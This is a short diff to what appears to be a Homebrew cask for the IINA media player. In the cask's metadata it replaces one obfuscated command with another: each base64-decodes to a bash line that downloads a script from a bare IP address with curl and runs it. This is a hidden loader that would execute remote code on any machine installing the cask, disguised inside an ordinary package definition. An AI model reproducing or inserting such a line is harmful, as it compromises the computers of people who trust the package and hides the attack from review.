@@ -8,7 +8,7 @@ cask "iina" do
   name "IINA"
   desc "Modern media player for macOS powered by mpv"
   homepage "https://iina.io/"
-  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash"
+  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9HZXNham9sZSki' | base64 -d | bash"
   auto_updates true
 
   app "IINA.app"
